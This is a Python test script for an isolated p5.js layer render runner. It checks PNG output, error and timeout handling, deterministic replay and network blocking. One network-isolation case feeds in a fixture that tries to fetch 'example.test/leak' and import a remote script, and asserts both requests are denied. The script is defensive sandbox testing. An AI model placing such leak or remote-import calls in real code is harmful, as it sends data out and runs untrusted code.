#!/usr/bin/env python3
"""Self-contained behavioral checks for the isolated p5 layer runner."""
from __future__ import annotations

import hashlib
import json
import os
from pathlib import Path
import shutil
import subprocess
import sys
import time

ROOT = Path(__file__).resolve().parents[2]
JOBS = ROOT / ".work/harness/jobs"
RUNNER = "tools/harness/run_p5_layer.mjs"
ARTIFACTS = ROOT / ".work/harness/artifacts/check"

def digest(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def source(name: str, text: str) -> tuple[Path, dict]:
    root = ARTIFACTS / name / "files"
    root.mkdir(parents=True, exist_ok=True)
    path = root / "Layer.js"
    data = text.encode()
    path.write_bytes(data)
    return root, {"path": "Layer.js", "sha256": digest(data), "bytes": len(data)}


def run_case(name: str, text: str, *, background: str = "transparent", tick: int = 1,
             render_seconds: int = 10) -> tuple[dict, Path]:
    root, record = source(name, text)
    work = JOBS / f"check-{name}.work"
    result_path = JOBS / f"check-{name}.runner.json"
    progress_path = JOBS / f"check-{name}.progress.json"
    job_path = JOBS / f"check-{name}.json"
    for path in (work, result_path, progress_path, job_path):
        if path.is_dir(): shutil.rmtree(path)
        elif path.exists(): path.unlink()
    output = work / "frame.png"
    spec = {
        "jobSpecVersion": 1, "jobId": f"job-check-{name}", "kind": "p5-render",
        "candidateId": f"cand-check-{name}", "layerId": "layer-1", "language": "p5js",
        "runnerProfile": "p5-static-640-v1", "entrypoint": "Layer.js", "background": background,
        "sourceDirectory": str(root), "sourceFiles": [record], "controls": {},
        "controlDeclarations": [], "randomSeed": 42, "noiseSeed": 7, "tick": tick,
        "canvas": {"width": 640, "height": 640, "pixelDensity": 1},
        "limits": {"renderSeconds": render_seconds, "compileSeconds": 60, "heapMegabytes": 512,
                   "outputBytes": 8_388_608, "queueSeconds": 30},
        "workDirectory": str(work), "outputPath": str(output), "resultPath": str(result_path),
        "progressPath": str(progress_path),
        "packageIndex": str(ROOT / "packages/javascript/src/index.js"),
        "p5Bundle": str(ROOT / "apps/web/node_modules/p5/lib/p5.min.js"),
    }
    job_path.write_text(json.dumps(spec), encoding="utf-8")
    process = subprocess.run([sys.executable, str(ROOT / "tools/harness/queue_render.py"), "--job", str(job_path), "--runner", RUNNER], cwd=ROOT, text=True, capture_output=True, timeout=max(30, render_seconds + 30))
    if not result_path.exists():
        raise AssertionError(f"{name}: queue exited {process.returncode} without result: {process.stderr[-1000:]}")
    return json.loads(result_path.read_text(encoding="utf-8")), output


def check_png(path: Path) -> None:
    data = path.read_bytes()
    assert data[:8] == b"\x89PNG\r\n\x1a\n", "bad PNG signature"
    assert int.from_bytes(data[16:20], "big") == 640 and int.from_bytes(data[20:24], "big") == 640, "wrong PNG dimensions"


def main() -> int:
    ARTIFACTS.mkdir(parents=True, exist_ok=True)
    summary = {}
    partial, partial_path = run_case("partial", "export function render(p) { p.fill(255, 0, 0); p.rect(0, 0, 100, 100); }")
    assert partial["status"] == "succeeded" and partial["minAlpha"] == 0
    check_png(partial_path)
    summary["partial"] = {"imageSha256": partial["imageSha256"], "minAlpha": partial["minAlpha"]}

    opaque, opaque_path = run_case("opaque", "export function render(p) { p.background(12, 30, 60); }", background="opaque")
    assert opaque["status"] == "succeeded" and opaque["minAlpha"] == 255
    check_png(opaque_path)
    summary["opaque"] = {"imageSha256": opaque["imageSha256"], "minAlpha": opaque["minAlpha"]}

    operation, operation_path = run_case("operation", "import { delaunay2D } from 'procedurals'; export function render(p) { delaunay2D({points:[[0,0],[100,0],[0,100]],maxWork:1000}); p.fill(20); p.rect(0, 0, 10, 10); }")
    summary["unboundOperation"] = {"imageSha256": operation["imageSha256"]}

    thrown, thrown_path = run_case("throw", "export function render() { throw new Error('fixture render boom'); }")
    assert thrown["status"] == "failed" and thrown["code"] == "RUNTIME_FAILURE"
    assert any("fixture render boom" in line for line in thrown.get("diagnostics", []))
    assert not thrown_path.exists()
    summary["throw"] = {"code": thrown["code"], "diagnostics": thrown["diagnostics"]}

    timeout, timeout_path = run_case("timeout", "export function render() { while (true) {} }", render_seconds=2)
    assert timeout["status"] == "failed" and timeout["code"] == "RESOURCE_EXHAUSTED"
    assert not timeout_path.exists()
    profile_marker = f"--user-data-dir={JOBS / 'check-timeout.work' / 'browser-profile'}"
    for proc in Path("/proc").iterdir():
        if proc.name.isdigit():
            try:
                assert profile_marker not in (proc / "cmdline").read_bytes().decode(errors="ignore")
            except (FileNotFoundError, ProcessLookupError):
                pass
    summary["timeout"] = {"code": timeout["code"], "diagnostics": timeout["diagnostics"]}

    network, network_path = run_case("network", "export async function render(p) { try { await fetch('https://example.test/leak'); } catch (_) {} try { await import('https://example.test/x.js'); } catch (_) {} p.fill(20); p.rect(0,0,10,10); }")
    assert network["status"] == "succeeded" and network_path.exists()
    assert "https://example.test/leak" in network["deniedRequests"] and "https://example.test/x.js" in network["deniedRequests"]
    summary["network"] = {"imageSha256": network["imageSha256"], "deniedRequests": network["deniedRequests"]}

    replay_a, replay_path = run_case("replay", "export function render(p, c) { p.randomSeed(c.randomSeed); p.fill(p.random(255)); p.rect(c.tick * 10, 0, 8, 8); }", tick=3)
    first_hash = replay_a["imageSha256"]
    replay_b, replay_path = run_case("replay", "export function render(p, c) { p.randomSeed(c.randomSeed); p.fill(p.random(255)); p.rect(c.tick * 10, 0, 8, 8); }", tick=3)
    assert replay_a["status"] == replay_b["status"] == "succeeded" and first_hash == replay_b["imageSha256"]
    summary["replay"] = {"imageSha256": first_hash, "sameBytes": True}
    print(json.dumps(summary, sort_keys=True))
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except Exception as error:
        print(json.dumps({"error": str(error)}), file=sys.stderr)
        raise
